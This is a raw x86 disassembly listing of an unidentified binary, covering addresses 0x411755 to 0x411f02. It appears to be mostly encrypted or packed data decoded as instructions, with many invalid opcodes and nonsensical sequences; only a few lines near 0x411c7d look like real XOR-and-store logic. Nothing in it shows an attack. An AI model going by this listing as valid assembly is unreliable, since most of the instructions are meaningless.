  411755:	mov    eax,0x3d2be640
  41175a:	pop    DWORD PTR [ebp+0x35]
  41175d:	in     al,0x4e
  41175f:	dec    esp
  411760:	(bad)
  411763:	xchg   ebp,eax
  411764:	mov    ds:0x725c93ec,al
  411769:	stc    
  41176a:	aaa    
  41176b:	dec    esi
  41176c:	cli    
  41176d:	out    dx,eax
  41176e:	xor    BYTE PTR [ebx-0x6c],0x42
  411772:	loopne 0x411705
  411774:	test   BYTE PTR [ebx],0x78
  411777:	(bad)  [esi+0x61]
  41177a:	cmp    dl,BYTE PTR [eax+0x55f2f9e7]
  411780:	sub    BYTE PTR [edx],bl
  411782:	push   ebp
  411783:	test   BYTE PTR [esi+0x3c],0x6b
  411787:	in     al,dx
  411788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411789:	test   DWORD PTR [edx-0x17],eax
  41178c:	popa   
  41178d:	cwde   
  41178e:	sub    DWORD PTR [ebx+eax*8+0x9f02401],ebp
  411795:	fcomi  st,st(3)
  411797:	xor    al,0xa2
  411799:	rol    DWORD PTR [ecx],cl
  41179b:	cmp    dh,ch
  41179d:	or     bh,bl
  41179f:	mov    dl,0x72
  4117a1:	leave  
  4117a2:	les    eax,FWORD PTR [ecx]
  4117a4:	aad    0x44
  4117a6:	sti    
  4117a7:	sbb    edi,DWORD PTR [edx]
  4117a9:	arpl   WORD PTR [ecx-0x74e6bfd6],si
  4117af:	pop    eax
  4117b0:	mov    ebx,0xd72ea42
  4117b5:	push   es
  4117b6:	ss (bad) 
  4117b8:	cmp    dl,al
  4117ba:	rcr    DWORD PTR [ebx],0xe4
  4117bd:	cmc    
  4117be:	add    eax,0x47afc3d4
  4117c3:	push   ecx
  4117c4:	mov    eax,ds:0x4a2a23c9
  4117c9:	test   eax,0xf8d17e2b
  4117ce:	inc    ebp
  4117cf:	and    esp,DWORD PTR [ebx+0x538b8881]
  4117d5:	je     0x41179f
  4117d7:	pop    ebp
  4117d8:	xor    BYTE PTR [edi+0x2182a29a],dh
  4117de:	test   al,0xdd
  4117e0:	sub    BYTE PTR [ebp-0x61],bl
  4117e3:	ret    0x63d8
  4117e6:	pusha  
  4117e7:	xchg   DWORD PTR [edx+0x2e],ecx
  4117ea:	in     eax,0x99
  4117ec:	enter  0x9d69,0xd9
  4117f0:	fstp   QWORD PTR [edx]
  4117f2:	lock pop esp
  4117f4:	int    0x5c
  4117f6:	jno    0x411834
  4117f8:	fnstenv [ebp-0x12cfab4]
  4117fe:	xchg   ebx,eax
  4117ff:	rol    ebx,1
  411801:	xor    dh,bl
  411803:	nop
  411804:	(bad)  
  411805:	in     al,dx
  411806:	adc    BYTE PTR [ebx],cl
  411808:	std    
  411809:	sub    al,0x7f
  41180b:	frstor [edx-0x7e7d0559]
  411811:	nop
  411812:	lock mul BYTE PTR [edi+ebx*1]
  411816:	or     BYTE PTR [edx-0x5bdee7d2],0xf4
  41181d:	cli    
  41181e:	pop    ds
  41181f:	enter  0xf45d,0x96
  411823:	xchg   ah,ah
  411825:	xchg   edi,eax
  411826:	test   DWORD PTR [ecx-0x42],ecx
  411829:	out    dx,al
  41182a:	pop    es
  41182b:	cld    
  41182c:	xor    eax,0x58406bd5
  411831:	push   eax
  411832:	pop    eax
  411833:	in     eax,0x6a
  411835:	dec    edi
  411836:	aaa    
  411837:	push   ebp
  411838:	dec    WORD PTR [ecx+0x2b0c758b]
  41183f:	ret    0x581
  411842:	cmc    
  411843:	cld    
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	jp     0x41184d
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x1aa7917],dl
  41187c:	add    esi,DWORD PTR [esi+0x57]
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411817
  411886:	ja     0x411899
  411888:	es jbe 0x41188d
  41188b:	xchg   BYTE PTR [ebx+0x51],ch
  41188e:	mov    ch,0x26
  411890:	add    al,BYTE PTR [eax-0x3321fef8]
  411896:	mov    edi,0x7cd3554c
  41189b:	mov    cl,0x4c
  41189d:	leave  
  41189e:	xor    BYTE PTR [ebx+0x2e],bl
  4118a1:	push   ebp
  4118a2:	enter  0x7761,0xa1
  4118a6:	mov    ds:0x1bdd7361,eax
  4118ab:	mov    dh,0xd5
  4118ad:	scas   al,BYTE PTR es:[edi]
  4118ae:	and    eax,0xa693e27a
  4118b3:	stc    
  4118b4:	mov    cl,0x19
  4118b6:	xchg   ecx,eax
  4118b7:	sahf   
  4118b8:	fcomp  st(3)
  4118ba:	cs jo  0x4118e9
  4118bd:	or     bh,dl
  4118bf:	inc    ebx
  4118c0:	clc    
  4118c1:	std    
  4118c2:	unpcklps xmm1,XMMWORD PTR es:[eax+0x25]
  4118c7:	xcrypt-cfb (bad)
  4118c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118c9:	and    DWORD PTR [edi],ecx
  4118cb:	mov    ebp,0xfd101e48
  4118d0:	push   0xffffffa5
  4118d2:	popa   
  4118d3:	out    dx,al
  4118d4:	jae    0x41187d
  4118d6:	call   0x675e1ca5
  4118db:	bound  edx,QWORD PTR [ecx+esi*2-0x26]
  4118df:	bound  esp,QWORD PTR [ebp-0x31e2ca69]
  4118e5:	mov    ebp,DWORD PTR [ebp+0x23bf74a2]
  4118eb:	aam    0x71
  4118ed:	mov    ch,0xae
  4118ef:	ins    BYTE PTR es:[edi],dx
  4118f0:	std    
  4118f1:	(bad)  
  4118f2:	in     eax,0xbd
  4118f4:	mov    dl,BYTE PTR [ecx+0x22]
  4118f7:	in     al,0xf5
  4118f9:	xor    BYTE PTR [ebx],cl
  4118fb:	aaa    
  4118fc:	mov    BYTE PTR [edx+0x6a],bh
  4118ff:	mov    al,BYTE PTR [eax-0x74856421]
  411905:	retf   0xc8b
  411908:	dec    ebx
  411909:	test   eax,0xac72b439
  41190e:	mov    al,0x88
  411910:	push   ds
  411911:	retf   
  411912:	mov    al,ds:0xc195daf2
  411917:	cmp    DWORD PTR gs:[ebp+esi*1-0x7f],eax
  41191c:	cmc    
  41191d:	cmp    al,0x2
  41191f:	int3   
  411920:	xor    edx,edi
  411922:	jg     0x41193a
  411924:	push   ebp
  411925:	test   DWORD PTR [eax-0x1c42cb77],ebp
  41192b:	xor    DWORD PTR [edi+edi*1],ebx
  41192e:	mov    bh,0xfc
  411930:	js     0x4119b0
  411932:	jae    0x411937
  411934:	push   ebp
  411935:	lock adc bh,BYTE PTR [ebp-0x3238ec13]
  41193c:	cmc    
  41193d:	(bad)  
  41193e:	sbb    BYTE PTR [ebp-0x752a25a7],bh
  411944:	hlt    
  411945:	mov    ?,WORD PTR [esi+ebp*1+0x3d]
  411949:	pop    ebx
  41194a:	push   es
  41194b:	lahf   
  41194c:	sub    DWORD PTR [ebx+eax*1],esp
  41194f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411950:	add    DWORD PTR [ecx+0x17],ebx
  411953:	or     al,dl
  411955:	mov    ds:0x9d2a1ee4,eax
  41195a:	xchg   edx,eax
  41195b:	cld    
  41195c:	push   cs
  41195d:	addr16 stc 
  41195f:	loope  0x4119d8
  411961:	xchg   edi,eax
  411962:	dec    eax
  411963:	sub    bh,BYTE PTR ds:0x1443ec38
  411969:	(bad)  
  41196a:	out    dx,eax
  41196b:	outs   dx,BYTE PTR ss:[esi]
  41196d:	daa    
  41196e:	imul   ebp,DWORD PTR [ebp+0x1947f9dd],0x311b4b1e
  411978:	push   edx
  411979:	ja     0x4119ee
  41197b:	fcmovnbe st,st(6)
  41197d:	mov    eax,0xd8c79080
  411982:	sub    edx,ecx
  411984:	pop    es
  411985:	and    DWORD PTR [eax-0x11],ebp
  411988:	adc    BYTE PTR [edi+0x55226107],cl
  41198e:	add    ecx,DWORD PTR [eax+0x6db0933e]
  411994:	pusha  
  411995:	loope  0x411935
  411997:	hlt    
  411998:	mov    DWORD PTR [edx+0x4dd55c90],edi
  41199e:	and    BYTE PTR [ebx+0x64c27a3f],ch
  4119a4:	xchg   edi,eax
  4119a5:	jle    0x411956
  4119a7:	adc    DWORD PTR [ecx+edi*2],edi
  4119aa:	and    al,0x95
  4119ac:	cwde   
  4119ad:	imul   ecx,DWORD PTR [eax-0xc],0xffffffb2
  4119b1:	dec    edi
  4119b2:	add    esi,DWORD PTR [edx+eiz*2-0x54]
  4119b6:	or     eax,0xc4bd4b88
  4119bb:	adc    DWORD PTR [ebx+0x56],ebp
  4119be:	sbb    ecx,ecx
  4119c0:	sahf   
  4119c1:	push   0xeff89af5
  4119c6:	sbb    DWORD PTR [ecx],edi
  4119c8:	lods   eax,DWORD PTR ds:[esi]
  4119c9:	out    0xd7,al
  4119cb:	fsubr  DWORD PTR [edi-0x52]
  4119ce:	sbb    ecx,DWORD PTR [ebx+0x7652911b]
  4119d4:	add    ebx,DWORD PTR [edx+0x27a23b9e]
  4119da:	push   ebx
  4119db:	sbb    ebp,ebx
  4119dd:	sbb    eax,0xe6df12c7
  4119e2:	jg     0x411a21
  4119e4:	loope  0x4119cf
  4119e6:	pop    ss
  4119e7:	pop    edx
  4119e8:	lea    edx,[ebx+0x3f]
  4119eb:	mov    ebp,0x1ab0e87d
  4119f0:	push   ss
  4119f1:	outs   dx,BYTE PTR ds:[esi]
  4119f2:	jae    0x4119fd
  4119f4:	fld    DWORD PTR [ebp-0x3c]
  4119f7:	mov    dl,0x46
  4119f9:	jmp    0x3a1f1d3
  4119fe:	sbb    al,0x8b
  411a00:	xchg   edi,eax
  411a01:	pop    esi
  411a02:	(bad)  [edx]
  411a04:	je     0x4119bd
  411a06:	fidiv  DWORD PTR [ebp+0x2]
  411a09:	retf   
  411a0a:	stc    
  411a0b:	dec    ecx
  411a0c:	test   dh,0x6e
  411a0f:	cmp    al,al
  411a11:	(bad)  
  411a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a13:	and    DWORD PTR [ebx],0xf0dfef7b
  411a19:	mov    eax,ds:0xeae50a06
  411a1e:	xchg   esi,eax
  411a1f:	out    0xaf,eax
  411a21:	mov    ebp,0xad460652
  411a26:	mov    DWORD PTR [ebp-0x16],0x9a224d6e
  411a2d:	cmp    eax,0xf546aa97
  411a32:	pop    ds
  411a33:	xchg   esi,eax
  411a34:	inc    esi
  411a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a36:	adc    DWORD PTR [ebx],esi
  411a38:	sub    al,bl
  411a3a:	cmp    DWORD PTR [ebx+0x23a0aa5f],0x6890562b
  411a44:	sub    ch,BYTE PTR [ecx-0x33]
  411a47:	loop   0x411ac2
  411a49:	jbe    0x4119e0
  411a4b:	push   ss
  411a4c:	xor    edx,DWORD PTR [ebx]
  411a4e:	out    dx,al
  411a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a50:	js     0x411a7b
  411a52:	sbb    dh,dl
  411a54:	in     al,dx
  411a55:	adc    bl,BYTE PTR [ebx+ebp*4-0x16025ffe]
  411a5c:	push   ecx
  411a5d:	std    
  411a5e:	test   BYTE PTR [esi],0xe5
  411a61:	sbb    BYTE PTR [edi+0x21],cl
  411a64:	cmp    esi,ebx
  411a66:	mov    ds:0xb17c88f,al
  411a6b:	jge    0x411a8c
  411a6d:	data16 test al,0x11
  411a70:	jg     0x411adc
  411a72:	dec    ebx
  411a73:	pop    ss
  411a74:	cmp    DWORD PTR [edi+esi*4+0x4230da39],0x35ac8ab6
  411a7f:	pushf  
  411a80:	push   ebp
  411a81:	xchg   ebp,eax
  411a82:	jne    0x411a25
  411a84:	fs inc ebp
  411a86:	les    ebp,FWORD PTR ds:0xbf617fed
  411a8c:	jb     0x411ac8
  411a8e:	mov    al,ds:0xd9c5dfed
  411a93:	std    
  411a94:	pop    ecx
  411a95:	add    eax,0x297e7263
  411a9a:	popa   
  411a9b:	je     0x411a78
  411a9d:	(bad)  [edi]
  411a9f:	xchg   ebx,eax
  411aa0:	xchg   esp,eax
  411aa1:	cmp    BYTE PTR [edx+0x50],dh
  411aa4:	and    al,bl
  411aa6:	add    al,0x77
  411aa8:	cs int3 
  411aaa:	push   ebp
  411aab:	push   0x2a7eca40
  411ab0:	mov    ah,0x82
  411ab2:	jae    0x411a9b
  411ab4:	lahf   
  411ab5:	fimul  WORD PTR [edi-0x4b89f179]
  411abb:	mov    dh,0x39
  411abd:	int3   
  411abe:	cli    
  411abf:	lds    edi,FWORD PTR [ebp-0x94cb3cf]
  411ac5:	xchg   BYTE PTR [edx],ch
  411ac7:	and    DWORD PTR [edi-0x15],eax
  411aca:	jecxz  0x411b3d
  411acc:	adc    eax,0x6f57600d
  411ad1:	cmp    eax,0x95558582
  411ad6:	pop    esp
  411ad7:	push   ebx
  411ad8:	or     ch,bh
  411ada:	fimul  DWORD PTR [ebp-0x5d]
  411add:	mov    ebp,0x2cbc2722
  411ae2:	jns    0x411b25
  411ae4:	scas   eax,DWORD PTR es:[edi]
  411ae5:	dec    ecx
  411ae6:	fisttp WORD PTR [ecx+ecx*2]
  411ae9:	mov    ds:0x6f29a3d2,eax
  411aee:	outs   dx,DWORD PTR ds:[esi]
  411aef:	cmp    ebx,eax
  411af1:	sbb    bl,al
  411af3:	mov    dl,0x2f
  411af5:	sbb    ebp,DWORD PTR [eax]
  411af7:	jp     0x411b1b
  411af9:	cwde   
  411afa:	stc    
  411afb:	push   esi
  411afc:	test   DWORD PTR [eax+eiz*8-0x6cd11cfe],eax
  411b03:	push   ss
  411b04:	pop    eax
  411b05:	mov    eax,ds:0x2f6e2661
  411b0a:	stos   BYTE PTR es:[edi],al
  411b0b:	pop    edi
  411b0c:	aad    0xb3
  411b0e:	ror    DWORD PTR ds:0x19fbdf71,0xd2
  411b15:	sar    DWORD PTR [ecx+0x25ed5708],0x8f
  411b1c:	and    DWORD PTR cs:[ebp+0x79],ebx
  411b20:	xor    DWORD PTR ds:0xc2a8c31e,eax
  411b26:	mov    ecx,0xdb5551d5
  411b2b:	mov    DWORD PTR ds:0x9a9256d2,esp
  411b31:	mov    ch,0xc0
  411b33:	lea    esp,[edi]
  411b35:	mov    al,ds:0x15a1bd0a
  411b3a:	gs push ecx
  411b3c:	shr    BYTE PTR [eax-0x2b55a442],0x54
  411b43:	(bad)  
  411b44:	(bad)  
  411b45:	imul   edi,DWORD PTR [edx],0x64
  411b48:	and    DWORD PTR [ebx],ebp
  411b4a:	(bad)  
  411b4b:	sub    al,bh
  411b4d:	(bad)  
  411b4f:	mov    edx,0x1c92f628
  411b54:	pusha  
  411b55:	pop    ss
  411b56:	popf   
  411b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b58:	mov    dh,0x46
  411b5a:	xchg   esp,eax
  411b5b:	mov    ebp,0xa716f7ae
  411b60:	push   ecx
  411b61:	or     al,0x27
  411b63:	retf   
  411b64:	jmp    0x264d3d0f
  411b69:	push   esi
  411b6a:	loope  0x411b14
  411b6c:	and    al,0x28
  411b6e:	aad    0x22
  411b70:	shr    DWORD PTR [ecx-0x49acba84],cl
  411b76:	pusha  
  411b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b78:	fild   QWORD PTR [edx+0x43a18377]
  411b7e:	cli    
  411b7f:	call   0xf80d7f52
  411b84:	scas   eax,DWORD PTR es:[edi]
  411b85:	xor    esp,DWORD PTR [eax-0x44]
  411b88:	scas   eax,DWORD PTR es:[edi]
  411b89:	mov    dl,0xa3
  411b8b:	dec    esp
  411b8c:	mov    esi,0xe432f28d
  411b91:	nop
  411b92:	or     al,0xcf
  411b94:	pop    edx
  411b95:	adc    eax,0xa65862bd
  411b9a:	mov    ah,BYTE PTR [edi]
  411b9c:	mov    al,ds:0xf01ad750
  411ba1:	adc    BYTE PTR [ecx-0x4f],cl
  411ba4:	fldcw  WORD PTR [ecx+0x31]
  411ba7:	mov    bh,BYTE PTR [edx]
  411ba9:	loopne 0x411b38
  411bab:	push   edx
  411bac:	and    esp,edx
  411bae:	inc    ebx
  411baf:	push   ecx
  411bb0:	out    dx,al
  411bb1:	mov    cl,BYTE PTR [edx+0xcfcff67]
  411bb7:	and    BYTE PTR [edx+eiz*8+0x7ff100e0],0x36
  411bbf:	pop    edi
  411bc0:	int    0x29
  411bc2:	add    ah,ah
  411bc4:	and    BYTE PTR ds:0xf2b79d36,0xf8
  411bcb:	and    al,0x9a
  411bcd:	xchg   ecx,eax
  411bce:	push   0x54
  411bd0:	sbb    dh,BYTE PTR [ebx-0x7d]
  411bd3:	in     al,0x33
  411bd5:	cld    
  411bd6:	ret    
  411bd7:	cmp    al,0x25
  411bd9:	jp     0x411c12
  411bdb:	cld    
  411bdc:	inc    eax
  411bdd:	aam    0x52
  411bdf:	push   0xffffff8b
  411be1:	cmp    eax,DWORD PTR [esp+eiz*4]
  411be4:	iret   
  411be5:	aas    
  411be6:	retf   0x6c77
  411be9:	mov    ds:0xf032a6dd,eax
  411bee:	test   eax,0x2012324d
  411bf3:	inc    esp
  411bf4:	test   dh,0x94
  411bf7:	pop    esi
  411bf8:	jne    0x411c11
  411bfa:	pop    ds
  411bfb:	mov    DWORD PTR [ebp+0x1f],edx
  411bfe:	nop
  411bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c00:	sbb    BYTE PTR [edx-0x6ac1e8a7],0xaf
  411c07:	stos   DWORD PTR es:[edi],eax
  411c08:	rol    DWORD PTR [ebx],1
  411c0a:	lods   al,BYTE PTR ds:[esi]
  411c0b:	repnz int 0x63
  411c0e:	fild   DWORD PTR [esi+0xbe92f2]
  411c14:	jne    0x411bd9
  411c16:	mov    eax,ds:0x408892
  411c1b:	(bad)  
  411c1c:	imul   edi,DWORD PTR [edx],0x65
  411c1f:	outs   dx,DWORD PTR ds:[esi]
  411c20:	pusha  
  411c21:	pusha  
  411c22:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411c24:	outs   dx,BYTE PTR ds:[esi]
  411c25:	lods   eax,DWORD PTR ds:[esi]
  411c26:	int3   
  411c27:	ror    edx,0x65
  411c2a:	mov    ah,0xb9
  411c2c:	dec    esi
  411c2d:	or     edi,DWORD PTR ds:0x7090dc20
  411c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c34:	cmp    DWORD PTR [edi+0x79],edx
  411c37:	pushf  
  411c38:	cdq    
  411c39:	out    dx,eax
  411c3a:	out    dx,al
  411c3b:	iret   
  411c3c:	and    cl,ah
  411c3e:	jo     0x411c1e
  411c40:	repnz push cs
  411c42:	iret   
  411c43:	add    eax,DWORD PTR [eax]
  411c45:	ds push es
  411c47:	jp     0x411c44
  411c49:	popa   
  411c4a:	pop    ecx
  411c4b:	aam    0xb0
  411c4d:	mov    BYTE PTR [eax],0xc6
  411c50:	cld    
  411c51:	hlt    
  411c52:	xchg   DWORD PTR [ecx+0x24461dde],esp
  411c58:	cmc    
  411c59:	mov    dh,0x44
  411c5b:	lahf   
  411c5c:	mov    al,cs:0x4f7e860b
  411c62:	mov    eax,0xb73d11bb
  411c67:	enter  0xee75,0xb7
  411c6b:	add    BYTE PTR [edi-0x5f],ch
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x7a55495e
  411cb8:	rcr    DWORD PTR [esi+0x53],1
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c77
  411cc2:	add    BYTE PTR [ecx-0x7ccbe902],0xa2
  411cc9:	cdq    
  411cca:	sbb    BYTE PTR [ebp-0x21],al
  411ccd:	sar    BYTE PTR ds:0x1b5ff774,1
  411cd3:	pop    ecx
  411cd4:	inc    edi
  411cd5:	imul   esi,DWORD PTR [esi],0xc35fce5c
  411cdb:	mov    ebx,0x3bb14e9f
  411ce0:	push   ds
  411ce1:	mov    ebx,0x22231195
  411ce6:	call   FWORD PTR [eax+0x3927c2ff]
  411cec:	or     BYTE PTR [ecx+0x9],ch
  411cef:	jae    0x411c7a
  411cf1:	loop   0x411c76
  411cf3:	sti    
  411cf4:	fwait
  411cf5:	rcr    BYTE PTR [ebp-0x73],1
  411cf8:	push   es
  411cf9:	dec    ebx
  411cfa:	popa   
  411cfb:	pop    ecx
  411cfc:	out    dx,al
  411cfd:	data16 mov ah,0x62
  411d00:	sbb    dl,ch
  411d02:	imul   eax,DWORD PTR [esi-0x657f1ade],0x332d1f99
  411d0c:	fsub   DWORD PTR [esi]
  411d0e:	ss mov dl,0x80
  411d11:	ror    BYTE PTR [eax+0x7268866b],cl
  411d17:	test   DWORD PTR [ebp+0x5],eax
  411d1a:	dec    esp
  411d1b:	adc    eax,0x8f392ab6
  411d20:	mov    ebp,0xdefa7fab
  411d25:	sbb    DWORD PTR [edi+0x210a394],ebx
  411d2b:	lock cmp bl,al
  411d2e:	ror    edx,cl
  411d30:	int3   
  411d31:	or     esp,DWORD PTR [ebx+0x3e]
  411d34:	call   0xe2c2f968
  411d39:	lods   al,BYTE PTR ds:[esi]
  411d3a:	sub    eax,0xa5659dd3
  411d3f:	push   0x5
  411d41:	push   cs
  411d42:	sbb    al,0x45
  411d44:	outs   dx,BYTE PTR ds:[esi]
  411d45:	inc    esp
  411d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d47:	pop    es
  411d48:	and    edi,ecx
  411d4a:	xchg   esp,eax
  411d4b:	fbstp  TBYTE PTR [esi-0x7a]
  411d4e:	sbb    eax,0x3c84d773
  411d53:	dec    eax
  411d54:	mov    dh,BYTE PTR [ebx-0x7cb27862]
  411d5a:	cmp    cl,BYTE PTR ds:0xa88522b4
  411d60:	outs   dx,BYTE PTR ds:[esi]
  411d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d62:	(bad)  
  411d64:	shl    bl,0xf8
  411d67:	xchg   ebx,eax
  411d68:	mov    ch,0xdd
  411d6a:	mov    ecx,0xcf69b7ff
  411d6f:	cmp    cl,dl
  411d71:	pop    ds
  411d72:	popf   
  411d73:	xchg   ecx,eax
  411d74:	pop    es
  411d75:	inc    ebx
  411d76:	daa    
  411d77:	lods   eax,DWORD PTR ds:[esi]
  411d78:	lods   al,BYTE PTR ds:[esi]
  411d79:	lahf   
  411d7a:	iret   
  411d7b:	jbe    0x411d36
  411d7d:	sub    al,0xc3
  411d7f:	int3   
  411d80:	jmp    0x8e1f:0xcc9d5da5
  411d87:	test   BYTE PTR [eax-0x2f155b56],ah
  411d8d:	and    ebx,DWORD PTR [ebx+ebx*8-0x60]
  411d91:	jnp    0x411d70
  411d93:	mov    esi,0x9ce7475a
  411d98:	pushf  
  411d99:	out    dx,eax
  411d9a:	add    eax,0x57023a5
  411d9f:	popa   
  411da0:	test   BYTE PTR [edx],ah
  411da2:	or     dl,BYTE PTR [ebx]
  411da4:	sub    DWORD PTR [edx+ebp*1-0x52],ecx
  411da8:	adc    BYTE PTR [eax],dl
  411daa:	sub    ch,BYTE PTR [edi+0x2bda41a0]
  411db0:	stos   DWORD PTR es:[edi],eax
  411db1:	mov    esi,0x360bc709
  411db6:	rcr    DWORD PTR [eax-0x6016cf8c],cl
  411dbc:	xor    cl,BYTE PTR [esi-0x31]
  411dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dc0:	xor    ebp,DWORD PTR [si-0x6d0c]
  411dc5:	xor    al,0xf8
  411dc7:	dec    edi
  411dc8:	or     ebx,DWORD PTR [bx+si+0x39db]
  411dcd:	pop    ebp
  411dce:	add    dl,BYTE PTR [edi+0x8]
  411dd1:	mov    esi,0xd2981517
  411dd6:	(bad)  
  411dd7:	xor    DWORD PTR [edi+0x754447f6],ebx
  411ddd:	xlat   BYTE PTR ds:[ebx]
  411dde:	mov    bl,0x8a
  411de0:	fstp   DWORD PTR [ebx]
  411de2:	jnp    0x411e43
  411de4:	inc    ebp
  411de5:	stc    
  411de6:	xchg   edx,eax
  411de7:	mov    eax,ds:0x9f1530b2
  411dec:	and    eax,0xa69ac3e3
  411df1:	retf   0xe638
  411df4:	or     BYTE PTR [di-0x14],al
  411df8:	sub    ebx,DWORD PTR [ecx+0x3e]
  411dfb:	mov    bh,0xb8
  411dfd:	clc    
  411dfe:	mulps  xmm2,XMMWORD PTR [esi+0x55400910]
  411e05:	dec    ebp
  411e06:	pop    esi
  411e07:	jmp    0x411de8
  411e09:	call   0x71c2de1a
  411e0e:	or     BYTE PTR [esi-0x50],ch
  411e11:	push   cs
  411e12:	push   ds
  411e13:	push   es
  411e14:	enter  0x23f6,0xbf
  411e18:	pop    ss
  411e19:	xchg   ebp,eax
  411e1a:	mov    dl,0xd1
  411e1c:	inc    edx
  411e1d:	jge    0x411e31
  411e1f:	mov    WORD PTR [edx+0x1b],es
  411e22:	fcmovbe st,st(2)
  411e24:	out    0xfb,al
  411e26:	cmp    BYTE PTR [ecx-0x1f],al
  411e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2a:	inc    ebx
  411e2b:	fmul   st,st(3)
  411e2d:	stc    
  411e2e:	imul   esp,DWORD PTR [eax-0x6d],0x6e
  411e32:	adc    BYTE PTR [esi+edx*4],dh
  411e35:	cli    
  411e36:	sub    DWORD PTR [edx-0x4b606432],ebx
  411e3c:	pop    ecx
  411e3d:	(bad)  
  411e3e:	sub    BYTE PTR [edx],0x30
  411e41:	enter  0x9779,0x7a
  411e45:	stc    
  411e46:	call   0xbe8:0x627e5192
  411e4d:	push   edi
  411e4e:	in     al,0xb0
  411e50:	loopne 0x411e94
  411e52:	push   esi
  411e53:	adc    ebp,ecx
  411e55:	fiadd  WORD PTR [ebx-0x64d1f829]
  411e5b:	cmp    BYTE PTR [edx+0x2e],cl
  411e5e:	push   ecx
  411e5f:	fsubr  DWORD PTR [esi-0xfa17823]
  411e65:	mov    ebp,0xe17b28b4
  411e6a:	xchg   ebx,eax
  411e6b:	stos   DWORD PTR es:[edi],eax
  411e6c:	data16 daa 
  411e6e:	data16 jg 0x411e22
  411e71:	scas   al,BYTE PTR es:[edi]
  411e72:	jno    0x411e17
  411e74:	stos   DWORD PTR es:[edi],eax
  411e75:	cmc    
  411e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e77:	pop    esi
  411e78:	jmp    0x411e19
  411e7a:	(bad)  
  411e7b:	xchg   esi,eax
  411e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e7d:	in     al,0xa6
  411e7f:	jbe    0x411ef4
  411e81:	addr16 in eax,0x19
  411e84:	jno    0x411e4d
  411e86:	dec    esi
  411e87:	mov    ds:0xe8b7eaff,al
  411e8c:	iret   
  411e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e8e:	jp     0x411e8d
  411e90:	fnstenv [ebx-0x5c]
  411e93:	push   0x48361b9c
  411e98:	mov    ?,WORD PTR [ebx+eax*1]
  411e9b:	ret    
  411e9c:	jg     0x411ec4
  411e9e:	and    esp,DWORD PTR [ebp+0x1]
  411ea1:	daa    
  411ea2:	xchg   ecx,eax
  411ea3:	(bad)  [ebx+0x20]
  411ea6:	(bad)  
  411ea7:	outs   dx,DWORD PTR ds:[esi]
  411ea8:	push   ebp
  411ea9:	scas   eax,DWORD PTR es:[edi]
  411eaa:	mov    al,0xd6
  411eac:	fisubr WORD PTR [eax]
  411eae:	cld    
  411eaf:	sar    DWORD PTR gs:[ecx-0x656842d9],1
  411eb6:	xchg   edx,eax
  411eb7:	mov    ch,0x0
  411eb9:	cmp    BYTE PTR [ecx],0xcb
  411ebc:	push   eax
  411ebd:	xchg   ebp,eax
  411ebe:	nop
  411ebf:	mov    BYTE PTR [edi+0x53dd7f18],ah
  411ec5:	or     ecx,0xffffff84
  411ec8:	mov    edi,0xa7527095
  411ecd:	faddp  st(7),st
  411ecf:	call   0x28fa:0xee4f7202
  411ed6:	mov    ah,0x39
  411ed8:	mov    esp,0xefbbbe55
  411edd:	sbb    ecx,DWORD PTR [edi-0x29]
  411ee0:	hlt    
  411ee1:	mov    ebp,0x2a3eff8e
  411ee6:	sahf   
  411ee7:	sub    DWORD PTR [ecx+0x5665b709],ecx
  411eed:	add    bl,BYTE PTR [ecx+ecx*1-0x70]
  411ef1:	push   ecx
  411ef2:	sub    eax,0x344bbb93
  411ef7:	mul    BYTE PTR [esi]
  411ef9:	lods   eax,DWORD PTR ds:[esi]
  411efa:	icebp  
  411efb:	test   eax,0x899fefc9
  411f00:	jp     0x411f2f
  411f02:	or     DWORD PTR [ebx-0x181adec2],edi
